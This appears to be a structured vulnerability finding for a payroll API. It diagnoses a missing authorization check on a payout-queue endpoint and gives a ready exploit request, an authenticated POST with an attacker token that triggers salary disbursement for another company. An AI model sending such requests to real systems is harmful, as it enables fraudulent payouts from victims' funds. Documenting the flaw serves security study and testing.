diagnosis: The endpoint enqueues a payroll payout job using companyId directly from the request payload. It does not verify that req.user is an authorized payroll administrator for that companyId, enabling attackers to trigger automated salary disbursements from victim enterprise treasury balances.
exploit_request:
POST /api/payroll/queue-payout HTTP/1.1
Host: payroll.fintech.io
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"companyId": "comp_target_corp_9918", "batchId": "batch_march_salaries_01"}
